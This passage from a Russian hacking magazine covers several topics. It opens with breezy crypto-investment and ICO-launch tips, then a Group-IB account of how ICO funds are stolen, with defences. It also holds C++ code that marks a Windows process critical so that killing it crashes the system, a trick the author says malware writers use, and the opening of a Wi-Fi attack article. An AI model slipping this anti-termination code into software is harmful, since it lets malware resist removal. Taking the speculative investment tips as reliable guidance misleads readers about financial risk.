 • Elastos (ELA) — децентра лизо ванная ось для создания и управления
   dApps. Конкурент EOS. Команда разработчиков базируется в Пекине
   и Шанхае. Elastos входит в груп пу G3, в сос таве которой также NEO и Bit‐
   main. G3 открыто сот рудничает с пра вительством Китая. В чис ле партне‐
   ров стартапа: Foxconn, Alibaba, Huawei, AVIC (государственная авиаком‐
   пания КНР) и другие. Дер жатели ELA будут получать эйрдропы всех монет,
   созданных в экосистеме Elastos.
 • NEO (ROI +22 004% c 01.10.2015). Фактически не явля ется децентрализо‐
   ванной криптовалютой. Создатель Antshares (позже переименованной
   в NEO под проведение ICO) — компания OnChain, име ет прямой доступ
    к истории транзакций и может быстро отследить любую сделку. Разработ‐
   чики контролируют более 60% всех блокчейн‐узлов NEO. «Китайский
   Ethereum» активно сот рудничает с пра вительством КНР. Зато поддержи‐
   вает множество языков программирования для написания смарт‐контрак‐
   тов и может пох вастаться высокой про пус кной способностью сети.


ЧЕТКИЕ СТАВКИ
Ну что, зачесались руки продать квартиру, машину, кошку и инвестировать
все в крипту? Отго варивать тебя никто (кроме, воз можно, кошки) не будет,
но прежде, чем что‐то покупать, нужно хорошенько ознакомиться с проектом.
Давай посмотрим, что отличает успешные ICO:
 • знаменитый основатель и силь ная команда;
 • глобальная масштабируемая идея, внятно изло женная в white paper;
 • работающий прототип проекта;
 • открытый исходный код;
 • блокчейн действитель но нужен данному проекту, а в идеале это новый
   и самый лучший блокчейн;
 • реалистичная дорожная карта;
 • справедливая система воз награждений для всех участников проекта
   на всех стадиях;
 • цена токена на стадии ICO не больше доллара;
 • эмиссия ограничена.

Крайне редко все эти составляющие можно най ти в одном проекте. Зачастую
достаточно громкого имени, под которое собира ются миллионы дол ларов,
а у проекта даже нет структуриро ванного пла на развития. Многие стартапы
сейчас конкурируют, пыта ясь создать очень схожие продукты. Далеко не во
всех нишах в будущем окажет ся воз можна подобная конкуренция, а значит,
без инвестиций и преданного сообщес тва часть стартапов будет постепенно
умирать, а цена на токены победителей расти до Луны.
   Если есть желание поймать криптоволну, вкладывайся в проекты, близ кие
твоему мировоззрению. Разложи по полочкам токены, в которые хочешь
инвестировать, и диверсифицируй риски. Нап ример, «азиатские монеты»
и «европейские монеты» или по используемому алгоритму консенсуса;
или подели на токены‐валюты и токены — ценные бумаги; стартапы, предос‐
тавляющие товар или услугу. Время от времени проводи ребалансировку
портфеля.


             ICOКак запус тить
Если ты вдруг замыслил провес ти ICO, чтобы собрать денег на свой проект,
то помни: потребуется как минимум полгода на подготовку и приличное
количество денег (сотни тысяч рублей — как минимум). Ну и конечно, тебя
ждут юридические риски и прочие сложные обстоятельства, знакомые стар‐
таперам. Вот какие тебя ждут этапы.
 1. Про верка идеи. Первым делом нуж но понять, не придумал ли ты пол ную
   дичь. Расскажи о своей идее друзь ям и пос тарайся выделить конс трук‐
   тивную критику из всего, что они тебе ответят. Поищи похожие проекты
   в интернете, почитай Bitcoin Forum. Воз можно, кто‐то уже все сделал
   за тебя или не сделал, но соб рал часть граблей.
 2. Ко ман да. В одиночку ты вряд ли спра вишься, так что ищи единомыш‐
   ленников. Нужны вооб ще все: контентщики, пиарщики, дизайнеры, тар‐
   гетологи, комьюнити‐менеджеры, прог раммис ты, конечно же. Знание
   английского — очень важно, а если кто‐то вдруг знает китай ский, то
   это большой плюс. На этом же эта пе нужно будет определиться с воз‐
   награждениями. Идеаль но, если  у тебя команда еди номышленни ков,
   готовая получить расчет после ICO. Но скорее всего, при дется проводить
   закрытую предпродажу токенов и собирать нужную на зарплаты сумму
   криптовалютой. Для этого потребуется как минимум MVP, функциони‐
   рующий сайт и дар убеждения. Или плати традиционно — из своего кар‐
   мана.
 3. Бе лая бумага. Пишем «кон ституцию» и «манифест» нашего проекта
   в соответствии с общепринятой типовой структурой. Чем убедительнее,
   тем больше шансов на успех. Заодно можешь набросать и «дорожную
   карту».
 4. Финан совые вопросы. Подключаем к проекту экономистов, а лучше
   специалистов по теории игр. Пресейл, баунти, эйрдроп, эскроу, бонусы,
   эмиссия токенов, партнеры, потенциальные биржи для листинга… Также
   на третьем‐четвертом этапе следует определиться: какую функцию будут
   выполнять твои токены? Что они дадут потенциаль ным инвесторам? Циф‐
   ровой купон, опцион на приобретение чего‐либо, новая криптовалюта,
   доступ к чему‐либо. Вариантов очень мно го. Все зависит от сферы при‐
   менения и от сути самой идеи проекта.
 5. Ре гистрация компании. Пос тоянно выходят новости о том, как в раз‐
   ных странах планируют регулировать ICO. Так что выбор юрисдикции край‐
   не важен, чтобы не получить по шапке. Подробно о тонких юридичес ких
   моментах ICO можешь почитать в бес платных книгах IT‐юрис та Владимира
   Попова: «ICO. Сущность, проб лемы, закон» и «ICO. Закон суров, но его
   нет» (PDF).
 6. Сайт, рассылка и соцсети. Конечно же, тебе понадобится сайт
   с дорожной картой и информа цией о команде, официальная рас сылка
    (чтобы не забывали!) и предста вительства в соцсетях.
 7. Пол ный аудит безопасности. Все усилия пойдут насмарку, если
   в самый важный момент у тебя уведут доступ к сайту или най дут уяз‐
   вимость в смарт‐контракте. Подробнее о том, как это происходит и как
   от этого защититься, читай в статье «Как кра дут деньги при ICO». При под‐
   готовке серьезного ICO обязательно нуж но подумать о пентестах, защите
   от DDoS и прочих мерах.
 8. Пиар всех мастей. ICO‐трекеры, Telegram‐каналы, традиционные СМИ,
   YouTube, таргетированная реклама. Bounty‐ и airdrop‐кампании (если
   решил их проводить). Словом, все, что считаешь уместным и на что хватит
   денег. На этом же этапе подкидываем работку фрилансерам — перевод‐
   чикам на языки народов мира.
 9. Вы пуск  токенов.  Выпус тить  собствен ные  токены  можно  прямо
   в интерфейсе Waves или аналогичных платформ, как фермер Шляпников
   из Колионово или завод по производству диоксида циркония ZrCoin. Дру‐
   гой вариант — разобрать ся в Solidity, дебаге и деп лое, чтобы получить то‐
   кен стандарта ERC20.
10. Вре мя «Ч». День тво его ICO настал. Если все прошло хорошо и тебе уда‐
   лось пережить фишинг, DDoS и прочие опас ности, а также продать нор‐
   мальное количество токенов, то помни: это было лишь начало пути. Теперь
   вкладчики ждут, что ты будешь раз вивать проект, на который собирал
   деньги. Так что паковать чемода ны и лететь на Бали рановато, впереди
   основная часть работы!




ЗАВЕРШАЯ КРУГ
Чем и, главное, когда закончится нынешняя криптошумиха, не знает никто.
Насколько велик «мыльный пузырь» и когда он лоп нет? А когда лопнет, оста‐
нется ли после него что‐нибудь? Уйдет ли в прошлое биткойн? Улетучится ли
«эфир» смарт‐контрактов?
   Технологические циклы всегда имеют начало и конец, так что нам остается
только наде яться на то, что блокчейн выживет достаточно долго, чтобы
победить бюрократию и сделать распределение вознаграждений справед‐
ливее во всех сферах.
COVERSTORY

  КАК КРАДУТ ДЕНЬГИ





  РАЗБИРАЕМ
    ТИПОВЫЕ
   СЦЕНАРИИ
 ПОХИЩЕНИЯ
    СРЕДСТВ
  И САМИХ ICO ПРИICO





        Александр Лазаренко
       Технический руководитель по
       защите блокчейн‐проектов
                Group‐IB





В 2017 году киберпреступникам удалось украсть 10% всех
средств, инвестирован ных в ICO через Ethereum. Общий
ущерб составил почти 225 миллионов долларов, 30 тысяч
инвесторов лишились в среднем по 7500 долларов. Раз‐
беремся, как именно кра дут деньги при ICO. Тут может быть
замешан весь хакерский арсенал, а могут использоваться
и самые примитив ные методы.


«Еще до начала ICO мы столкну лись с дюжиной фишинговых сайтов, DDoS‐
атаками и угро зами — от „ИГИЛ“ и от „италь янской мафии“: „Переве‐
дите 10 биткойнов на этот кошелек, ина че мы вас уничтожим!“», — вспомина‐
ет подготовку к сентябрь скому ICO Илья Ремизов, директор по технологиям
Blackmoon. Его команда обра тилась за защитой к нам — в Group‐IB, и мы
зачищали фишинговые сайты, нейтра лизовали этих шантажис тов‐вымога‐
телей.
  Меньше чем за двадцать часов Blackmoon соб рала более 30 миллионов
долларов. Но такое идеальное ICO случается не всегда. На криптовалютах
уже давно пытаются заработать не только спекулянты и криптоэнтузиасты,
но и хакеры, которые используют свои навыки для хищений и кибератак.
   Криптовалюта прив лекает киберпреступников еще с 2011 года: именно
тогда хакеры начали активно взламывать онлай новые кошельки,  крип‐
товалютные биржи и обменники, похищать приватные ключи от кошельков
физических лиц. Некоторые банковские трояны — TrickBot, Vawtrak, Qadars,
Triba, Marcher — были перена целены на пользовате лей криптовалютных
кошельков.
  Почувствовав  запах  денег,  атаковать  криптовалютные биржи  стали
не  только  традиционные  киберпреступники,  но  и прогосу дарственные
хакеры. К примеру, в недавних ата ках на южнокорей ские криптосервисы
подозревают хакеров из северо корейской группы Lazarus.
  В ранние дни Bitcoin от хакеров требовалась качественная подготовка
и обширный репертуар техник. Широкое распространение ICO сущес твенно
изменило ситуацию. Зачас тую даже ата кующий, который ничего не понимает
в блокчейне и защите информа ции, имеет возможность сорвать куш.


ПУТЬ К ICO
Когда команда решает провести ICO, она в первую очередь раз рабатывает
White Paper (WP) — документ, в котором описыва ется технология и биз‐
нес‐модель проекта. На основе раз работанного WP создается лендинг,
и организаторы прив лекают сообщество, интерес которого к проекту пос‐
тоянно подогревается новостями и возможностью пообщаться с командой.
В  какой‐то момент анонсиру ют  дату ICO, после чего следует череда
активностей до часа «икс»: рекламные кампании в поис ковиках и на прочих
ресурсах, почтовые рассылки и так далее. В наз наченное время откры вается
ICO, инвесторы получают возможность закупить токены проекта, а проект
принимает криптовалюту на свои кошель ки.
  На каком из шагов в пути ICO появляются хакеры? На всех! Хакеры, как и
все остальные инвесторы, тоже хотят заработать на ICO. Как только публику‐
ется первая версия White Paper, у зло умышленни ков появляется отправная
точка для начала операции.


КРАЖА WHITE PAPER
Одна из особенностей проектов блокчейн‐индустрии — это полная откры‐
тость и прозрачность. Большая часть раз работок и исходных кодов публику‐
ется в открытом доступе. Очевидно, что в первую очередь команда публикует
WP.
  Совсем недавно был зарегистрирован интересный случай, когда зло‐
умышленники смогли заработать на копировании чужого проекта. Схе ма выг‐
лядит очень просто: берется легитимный, хорошо проработанный White Paper
на русском языке, делается его полная копия через Google Translate, создает‐
ся лендинг с описанием проекта, новой командой (фей ковой, естественно)
и новым брендом. Проект гра мотно раскручивается в Сети: появляется кон‐
текстная реклама, огромные треды на Bitcointalk.org и так далее.
  Например, наши коллеги по цеху из Crypto Detectives обнаружи ли, что вла‐
дельцы проекта Wi‐Fi Global скопировали и перевели WP команды worldwiﬁ.io.
Если присмотреться внимательно, Wi‐Fi Global — это всего лишь немного
переработанный вариант World Wi‐Fi. При этом сообщество в «Телеграме»
у Wi‐Fi Global насчитывает две с лишним тысячи человек и, по словам участни‐
ков проекта, им удалось привлечь 500 тысяч дол ларов на pre‐ICO.





КОМПРОМЕТАЦИЯ АККАУНТОВ
Поскольку на сайте проекта обычно имеется детальная информация обо всех
членах команды, разведка для зло умышленни ков сущес твенно упрощается.
Ни для кого не секрет, что в Сети гуляет огромное количес тво дампов утек‐
ших паролей. Если скомпрометированный пароль используется где‐то еще,
то это может привести к крайне нежелательным последс твиям — не только
для владельца аккаунта, но и для проекта и инвесторов.
  Именно такая неприятная история приключилась с авторами проекта Enig‐
ma. Хакеры успели заработать полмиллиона долларов еще до того, как была
анонсирована дата про ведения ICO. Атакующие смогли скомпрометировать
веб‐сайт Enigma и несколько аккаунтов в соци альных сетях.
  Основатели проекта — выходцы из Мас сачусетского технологического
института. Исполнительный директор, по‐видимому, не очень любил исполь‐
зовать разные и сложные пароли для сво их акка унтов. Благодаря этому
хакеры получили доступ к адресу его электронной почты (на которой не было
двухфакторной аутентификации). Естественно, завладеть доступом к другим
сервисам и аккаунтам, привязанным к адресу, не составило труда. Следом
были скомпрометирова ны учет ные данные других членов команды. Злоумыш‐
ленники получили доступ к странице enigma.co (сайт, на котором произво‐
дилась продажа токенов, не был скомпрометирован) и мессенджеру Slack.
  Получив доступ к enigma.co, хакеры размести ли там анонс продажи
токенов, написали об этом в Slack в чате для сообщес тва и сделали почтовую
рассылку по украденному списку. Все это — чтобы распространить свой
адрес, на который предлагалось перевести токены. Все го им удалось соб‐
рать 1492 ETH — порядка полутора миллионов дол ларов.


ДЕФЕЙСЫ
Все самое плохое, как правило, происходит именно в день ICO. Шквал DDoS‐
атак одновременно с нап лывом пользователей, лавина сообщений в канал
проекта в Telegram и Slack, спам по списку рас сылок.
  Самое обидное, что может про изойти, — дефейс сайта во время ICO.
Цель хакеров очень прос тая: пос тавить на офи циальный портал проекта свой
кошелек и собирать средства на него.
  Жертвой такой атаки стал проект CoinDash. Во время ICO сайт CoinDash
был взломан, хакеры выс тавили на главной стра нице проекта нелегитимный
кошелек. Понятное дело, что все инвесторы ринулись закидывать крип‐
товалюту не на кошель ки CoinDash, а на хакерские. Жертвами атаки стали
больше двух тысяч инвесторов, потеряв в совокупности около 37 000 ETH.
  Команда проекта оказалась порядочной и воз местила ущерб инвесторам,
попавшимся в руки хакеров.


ФИШИНГ
Фишинг встречается почти всегда, когда на ICO выходит более‐менее извес‐
тный проект. Рассылка мошенничес ких писем, как правило, сопровождается
мощной DDoS‐атакой на сайт проекта. Смысл всего этого очень прост:
хакеры копируют содержимое сайта, делают похожий домен и выкладывают
в интернет. Ничего необычного здесь нет, все как и всегда. В слу чае с ICO
создаются фиши двух типов: пер вый тип заточен под кражу приватного ключа
пользователя, второй прос то просит переки нуть криптовалюту на адрес
кошелька или смарт‐контракта.
   Как  кто‐то может оставить на сайте мошенников приватный ключ?
Не кажется ли это подозрительным? Увы, когда в деле замешано желание
быстро обогатиться, случается еще и не такое. Судя по Etherscan, люди иног‐
да делают и пов торные переводы, ничего при этом не получая взамен.





По статистике компании Chainalysis, около 56% всех средств, украденных
с ICO, были похищены с помощью фишин говых атак. Примерная оценка
ущерба от фишин га — 115 миллионов долларов. По данным Group‐IB, круп‐
ная фишинговая группировка зарабатыва ет от 3 тысяч до 1 миллиона дол‐
ларов в месяц. Сейчас фишинг — самый популярный способ хищения
средств у инвесторов. В разгар «криптовалютной лихорадки» все стремятся
как можно быстрее купить токены (зачастую они про даются с большой скид‐
кой) и не обращают внимания на такие мелочи, как кривые домены.
   Типичная  схема —  злоумышленники  покупают  контекс тную  рекламу
в поисковых движках, организо вывают лавину сообщений в мес сенджерах
и любыми способами стараются наг нать тра фик на фишинговый  сайт.
В общем, при желании можно даже ввести показа тель инвестиционной прив‐
лекательности проекта, подсчитав количес тво фишинговых сайтов, сделан‐
ных на его основе.
   Готовясь к одной презентации, я сделал скрин шот с поиском ICO STORM
Token в Google. Он примеча телен тем, что первые три ссылки — это фишинг,
размещенный через контекстную рекламу. Кроме того, часто попадается
фишинговый MyEtherWallet. Будь те бдительны!





Есть очень хороший проект etherscamdb.info, где агре гиру ют фишинг по ICO.
В его базе насчитывается 2533 вхождения. Сущес твенно для столь молодой
индустрии. Для одного только MyEtherWallet зарегистрировано 2206 фишин‐
говых доменов.


КОГДА ТЕРЯЕШЬ ПОСЛЕ СБОРА
Самый плохой вариант для любой ICO‐команды — потерять средства после
успешного сбора. Это случает ся из‐за неаккуратного обращения с крип‐
товалютой,  уязвимостей  в  смарт‐контрактах и зиродеев  в популярных
кошельках. И даже если отбросить уяз вимости в собственном ПО, риск
потери средств в остальных случаях нивелировать дос таточно сложно.
   Хороший пример — проект The DAO, у которого атакующие смогли украсть
как минимум 53 миллиона долларов. Другой пример — проект aeternity,
у которого было похищено 30 миллионов долларов через зиродей‐уяз‐
вимость в кошельке Parity.
   Уязвимости смарт‐контрактов активно  изучают ся сообществом. Нап‐
ример, в работе ученых из Университета Кальяри (PDF) описаны разные тех‐
ники эксплуатации. Сущес твуют и попытки повысить безопасность — к при‐
меру, утилита Oyente про веря ет смарт‐контракты на уязвимости в автомати‐
ческом режиме.
  Скорее всего, «криминальные» смарт‐контракты еще найдут свое при‐
менение в мире высоких технологий. Например, в научной работе «Кольцо
Гига: иссле дование будущего криминальных смарт‐контрактов» (PDF) иссле‐
дователь Ари Юэльс и его коллеги рас сматривают варианты того, как можно
использовать смарт‐контракты во вред.


КАК ЗАЩИТИТЬ КОМАНДУ: ТИПОВОЙ СЦЕНАРИЙ
Самая уязвимая часть любого проекта — это его команда. Плохая защита
персональных аккаунтов, отсутс твие элементарной культуры компьютерной
гигиены зачастую приводит к тому, что аккаунты мессендже ров и соцсетей
компрометируются и атакующие получа ют воз можность рас сылать ссылки
на фишинговые сайты налево и направо, дискредитировать команду, менять
данные на сайтах и так далее. Хуже этого может быть только компрометация
приватных ключей от криптовалютных кошельков.
   Итак, вот что нужно сделать, чтобы проведение ICO не было омрачено
криминалом.
 1. Защита от DDoS‐атаки. Практичес ки каждый рас крученный проект стал‐
   кивается с атаками этого типа. Лучше заранее озаботиться качественной
   защитой от DDoS. Недос тупность сайта зачас тую отталкивает потенциаль‐
   ных инвесторов от вложений.
 2. Защита команды проекта. Все члены команды должны защитить свои пер‐
   сональные аккаунты в социальных сетях, пос тавить двухфакторную аутен‐
   тификацию, внедрить парольные политики.
 3. Информационная безопас ность приложений. Естественно, нужно про‐
   верить все на наличие уяз вимостей и сделать качественные нас тройки
   доступа к критич ным службам на серверах.
 4. Проверка смарт‐контрактов на наличие известных уязвимостей. Нужно
   как минимум просканировать их автоматическими средствами.
 5. Обучите комьюнити рас позна вать фишинг. Это относительно простая
   и дешевая мера, которая позволит существенно обезопасить потенциаль‐
   ных инвесторов от потери средств.


ВЫВОДЫ
Проанализировав более полутора сотен атак на блокчейн‐проекты (биржи,
обменники, кошельки, фонды), мы пришли к выводу, что основная масса
проблем кроется в уязвимос ти самих криптосервисов, использующих тех‐
нологию блокчейна. В случае с Ethereum криптосервисы сталкиваются как с
уязвимостями в собственных смарт‐контрактах, так и с хорошо изученными
проблемами вроде дефейсов, компрометации акка унтов и фишинга. Зачас‐
тую хакерам даже не нуж но знать особенности работы смарт‐контрактов
и тонкости работы блокчейна. Традиционные и хорошо отработанные методы
отлично работают при хищении крип товалюты у пользователей.
ВЗЛОМ

 КРИТИЧНЫЙ
 ПРОЦЕСС





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com





        УЧИМСЯ СОЗДАВАТЬ
    И ПРИНУДИТЕЛЬНО ЗАВЕРШАТЬ
   КРИТИЧНЫЕ ПРОЦЕССЫ В WINDOWS




Часть процессов операционной системы считаются «критич‐
ными» — если завершить один из них, Windows выпадет
в синий экран смерти и перезагрузится. Этим активно поль‐
зуются вирусописатели: если сделать свой процесс критич‐
ным, то его нельзя будет завершить просто так. В этой
статье я покажу, как создавать такие процессы и как при‐
бивать их без падения системы.


Дело в том, что хорошо орга низовать защиту процесса от завершения, когда
пользователь работает под учетной записью адми нистратора, практически
невозможно. Есть разные полумеры, но на полноценную защиту они не тянут.
Например, можно использовать драйверы режима ядра, но в 64‐битных опе‐
рационных системах не так просто преодолеть механизм Kernel Patch Protec‐
tion. Остается прибегать к трюкам вроде того, который мы раз берем.
  Давай посмотрим, как создать критичный процесс в Windows, как про‐
верить, что процесс является критичным, и как его завершить без падения
системы в BSOD. Строго говоря, создавать мы будем не процесс, а критич‐
ный  поток. Ведь процесс в Windows — это  что‐то вроде контейнера
для потоков, в которых и выполняет ся код.


           WARNING

                      Весь  код, который я привожу в  статье, нас‐
                        тоятельно рекомендую исполнять только в вир‐
                         туальной машине, потому что завершение кри‐
                        тического  процесса  вызовет  общесистемный
                      сбой и падение системы в BSOD с кодом CRITI‐
                   CAL_PROCESS_DIED и возможной потерей дан‐
                        ных. Все тесты я проводил в VirtualBox на Win‐
                     dows 10 LTSB x64 в качестве хоста.


Есть несколько методов, которые помогут нам соз дать критичный процесс.
Все они основаны на манипуляции вызовами NTAPI (Native Windows API),
самыми «низкоуровневыми», которые можно выполнить в режиме поль‐
зователя. Эти функции экспортиру ются ntoskrnl.exe. Через обертку ntdll.
dll мы сможем получить их адреса и вызвать их.


RTLSETPROCESSISCRITICAL
Первая функция Native API, которая поможет нам пометить процесс как кри‐
тичный, — это RtlSetProcessIsCritical. Ее прототип выглядит так:


NTSYSAPI
NTSTATUS
STDAPIVCALLTYPE
RtlSetProcessIsCritical(
    IN  BOOLEAN  NewValue,
    OUT PBOOLEAN OldValue OPTIONAL,
    IN  BOOLEAN  CheckFlag
);

Чтобы эта функция сработала, перед ее вызовом нужно будет получить при‐
вилегию SeDebugPrivilege. Это можно сделать через «обычные» функции
WinAPI.


BOOL setPrivileges(LPCTSTR szPrivName)
{
    TOKEN_PRIVILEGES tp = { 0 };
    HANDLE hToken = 0;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PR
IVILEGES, &hToken))
        std::cout << "OpenProcessToken failed\n";
    if (!LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].
Luid))
        std::cout << "LookupPrivilegeValue failed\n";
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL,
NULL))
    {
        std::cout << "AdjustTokenPrivileges failed\n";
        CloseHandle(hToken);
        return TRUE;
    }
    return FALSE;
}

Вызов функции для получения SE_DEBUG_NAME будет таким:


setPrivileges(SE_DEBUG_NAME);

Другой способ получить ее — это нативная функция RtlAdjustPrivilege:
нужно передать ей в качес тве первого параметра значение 20 (SE_DEBUG_‐
NAME). Разумеется, перед вызовом этой функции ее адрес следует получить
из ntdll.dll динамичес ки. Вызов будет выглядеть таким образом:


PBOOLEAN pbEn;
RtlAdjustPrivilege(20, TRUE, FALSE, pbEn);

Итак, привилегия получена, приступа ем к реализации основной функциональ‐
ности.


typedef NTSTATUS(NTAPI *pRtlSetProcessIsCritical)(BOOLEAN bNewValue,
BOOLEAN *pbOldValue, BOOLEAN  CheckFlag);
bool set_proc_critical()
{
    pRtlSetProcessIsCritical RtlSetProcessIsCritical = (pRtlSe
tProcessIsCritical)GetProcAddress(LoadLibrary(("ntdll.dll")), "RtlSet
ProcessIsCritical");
        if (NT_SUCCESS(RtlSetProcessIsCritical(TRUE, 0, FALSE)))
return TRUE;
            else return FALSE;
}

Здесь все понятно: функцию RtlSetProcessIsCritical получаем динами‐
ческой  линковкой  средс твами  GetProcAddress/LoadLibrary  напрямую
из ntdll.dll. Самая интересная строчка кода для нас — это


if (NT_SUCCESS(RtlSetProcessIsCritical(TRUE, 0, FALSE))) return TRUE;

Здесь мы передаем зна чение TRUE, ука зывая функции RtlSetProcessIs‐
Critical сделать процесс критичным. Одновременно мы проверяем возвра‐
щаемое ей значение, и в случае удачи наша функция возвращает TRUE. Если
вызвать RtlSetProcessIsCritical с параметром FALSE, процесс перес‐
танет быть критичным.
  Давай копнем немного глуб же и разберемся, как именно работает фун‐
кция RtlSetProcessIsCritical. Она вызыва ет функцию NtSetInformation‐
Process из Native API, которая обра щается к PEB процесса и меняет в нем
поле ThreadBreakOnTermination — оно и отвечает за то, чтобы операционка
считала наш процесс критичным.


             INFO

                      Блок окружения процесса (Process Environment
                          Block, PEB) заполняется загрузчиком операци‐
                      онной системы,  находится  в адресном  прос‐
                        транстве процесса и может быть модифицирован
                       из режима usermode. Он содержит много полей —
                       например, отсюда можно  узнать информацию
                      о текущем модуле, об окружении, о загруженных
                        модулях. Получить структуру PEB можно, обра‐
                        тившись к ней нап рямую по адресу fs:[30h]
                       для x86‐систем и gs:[60h] для x64.


Таким образом, мы переходим ко второму методу, который продемонс три‐
рует нам создание критичных про цес сов.


NTSETINFORMATIONPROCESS
NtSetInformationProcess — это нативная функция, которая поможет нам
изменить значение поля ThreadBreakOnTermination в PEB на нужное нам.
Адрес этой функции необходимо получить динамически из ntdll.dll, как мы
уже делали с RtlSetProcessIsCritical. Этот метод универсален, пос коль‐
ку, используя эту функцию, мы обеспечива ем совместимость с более ста‐
рыми версиями Windows: RtlSetProcessIsCritical появилась только в Win‐
dows 8.
  Реализация будет выглядеть следующим образом.


typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)(HANDLE, PROCES
SINFOCLASS, PVOID, ULONG, PULONG);
pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformati
onProcess)GetProcAddress(LoadLibrary(("ntdll.dll")), "NtSetInformatio
nProcess");
bool set_proc_critical(HANDLE hProc)
{
    ULONG count = 1;
    if (NT_SUCCESS(NtSetInformationProcess(hProc,
            0x1D, // ThreadBreakOnTermination в структуре PROCES
SINFOCLASS
            &count,
            sizeof(ULONG))))
        return TRUE;
    else return FALSE;
}

В функцию NtSetInformationProcess передаем хендл процесса, который
будем делать критичным, и число 0x1D, которое означает ThreadBreakOn‐
Termination в структуре PROCESSINFOCLASS.


ПРОВЕРКА КРИТИЧНОСТИ ПРОЦЕССА
Теперь, понимая, как операционная система определя ет статус наших про‐
цессов, и зная, какие именно функции WinAPI и NTAPI она при этом исполь‐
зует, мы легко сможем определить, является ли любой процесс критичным
или нет. Как обычно, воспользуемся сразу нес колькими методами.


BOOL check_critical(HANDLE hProc)
{
    ULONG count = 0;
    if(NT_SUCCESS(NtQueryInformationProcess (hProc,
            0x1D, // ThreadBreakOnTermination в структуре PROCES
SINFOCLASS
            &count,
            sizeof(ULONG),
            NULL)) && count)
        return TRUE;
    else return FALSE;
}

Здесь в функцию NtQueryInformationProcess передается хендл интересу‐
ющего нас процесса и поле в структуре PROCESSINFOCLASS, которое нужно
проверить. После выполнения функции NtQueryInformationProcess про‐
веряем перемен ную count, которая ста нет равна единице, если процесс кри‐
тичный.
  Кроме функции NtQueryInformationProcess, есть спе циальная функция,
предназначенная имен но для наших нужд, — IsProcessCritical. Ее про‐
тотип выглядит таким обра зом.


BOOL IsProcessCritical(HANDLE hProcess, PBOOL Critical);

Пример использования этой функции:


PBOOL test = FALSE;
if(IsProcessCritical(GetCurrentProcess(), test))
{
    if(test) std::cout << "Critical process\n";
    else std::cout << "NOT critical process\n";
}

Функция IsProcessCritical изменит переменную test на TRUE, если про‐
цесс критичный, или оставит FALSE в том случае, если это не так.


ВЫВОДЫ
В этой статье я постарался рас ска зать, что такое кри тичные процессы,
как ОС реагирует на их завершение. Также мы узнали, как снять флаг критич‐
ности с процесса, чтобы его безболезненно завершить, и как программно
проверить, является ли процесс критичным. Я надеюсь, что ты не будешь
применять полученную информа цию в деструктивных целях. Ну, раз ве что
для шуток над друзьями! :‐)
ВЗЛОМ

    ОДНА «АЛЬФА»
         ХОРОШО,
          А ДВЕ —
           ЛУЧШЕ!

          ГОТОВИМСЯ К ПРОДВИНУТЫМ
               ТЕХНИКАМ ВЗЛОМА WI‐FI





       84ckf1r3
   84ckf1r3@gmail.com





В прошлых статьях о пентестах точек доступа Wi‐Fi мы
разобрали базовые тех ники, а сейчас примемся за более
продвинутые.   Рассмотрим   особенности   адаптеров
и добавим мощности нашему донглу. Это необходимо, что‐
бы использовать ускоренные спо собы взлома, принудитель‐
но отключать беспроводные клиенты, атаковать скрытые
сети и обходить фильтрацию по MAC‐адресам.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



УВЕЛИЧИВАЕМ МОЩНОСТЬ WI-FI-АДАПТЕРА
Сильнее все го на эффективность ата ки влияет уровень сигнала. Твой донгл
должен быть достаточ но чувс твитель ным, чтобы услышать слабый сигнал ата‐
куемых точек доступа и перехватить все пакеты хендшейка. Одновременно
ему нужен мощный передатчик, ина че отсылаемые им команды деавториза‐
ции или перебора WPS‐пинов не дос тигнут цели.


Чувствительность приемника
Чем тише ты становишь ся, тем больше сможешь услышать — таков девиз Of‐
fensive Security, продвигающей популярный дис трибутив Kali Linux. Примени‐
тельно к вардрайвингу он озна чает, что слушать эфир, находить в нем точки
доступа Wi‐Fi (далее — AP, access points) и собирать хендшейки нужно с мак‐
симально чувствительным приемником. То есть с таким адаптером, у которо‐
го высокое соотношение сигнал/шум.
  Наивно ожидать его от USB‐свистков со встроенными антеннами — у них
очень слабый приемник, а слишком близко рас положенные электронные ком‐
поненты генерируют сильные помехи. Поэто му важно выбрать Wi‐Fi‐адаптер
не только с подходящим чипом, но и с адекватной схемотехникой (а в иде‐
але — с хорошим экранированием).
   Традиционно по этому показа телю лидирует Alfa Network. Даже современ‐
ные удешевленные ревизии без экра нирующей пластины показывают чудеса.
Например, AWUS051NH v2 лишен экра нирования, но сделан все на том же
чипе RT3572, и сделан качес твенно.





                           Чип RT3572





                    Вскрываем AWUS051NH v2

У него «правильный» чип RT3572 и весьма неплохая схемотехника (хотя у ста‐
рых адаптеров от Alfa Network она еще лучше). За две минуты сканирования
в моем тесте он пой мал 70 точек дос тупа с уровнем сигнала 18 дБм и выше.





                           Улов AWUS051

Сравним с результатами другого адаптера — Netis WF2150. Аналогичное мес‐
то и время, те же две минуты сканирования.





                            Улов WF2150

Всего 49 AP, а уровень сигнала от большинс тва из них упал ниже 18 дБм. Нес‐
мотря на «правильный» чип RT5572N, результаты оказываются плачевными
из‐за примитивной схемы самого адаптера. Как уже писал ранее, можно его
разобрать и подключить внеш нюю антенну к мини атюрному гнезду на плате.
Однако коэффициент усиления (КУ) внеш ней антенны — тоже пал ка о двух
концах, поскольку вместе с полезным сигналом рас тет и уровень шумов.
  Прежде чем менять антенну, обрати внимание на диаграмму направлен‐
ности и поэкспе римен тируй с час тично направленными антеннами. Узким
лучом «яги» сложно прицелиться, а вот панель ные антенны оказались очень
удобны на практике. Они дадут тебе широкий сектор градусов в шестьдесят.
По выбранному направлению они продемонстрируют результат примерно
в шесть раз лучше, чем если бы ты раз махивал полуметровым диполем.


             INFO

                     Антенна с более высоким КУ порой дает резуль‐
                        таты хуже, чем штатная кроха на 3 дБи. Поэтому
                      смот ри на тип антенны, расположение антенно го
                      модуля и его экранирование, а не пытайся срав‐
                        нивать децибелы в лоб и просто взять палку под‐
                        линнее. Только сочетание чипа с поддержкой
                     режима мониторин га и приемника с высокой
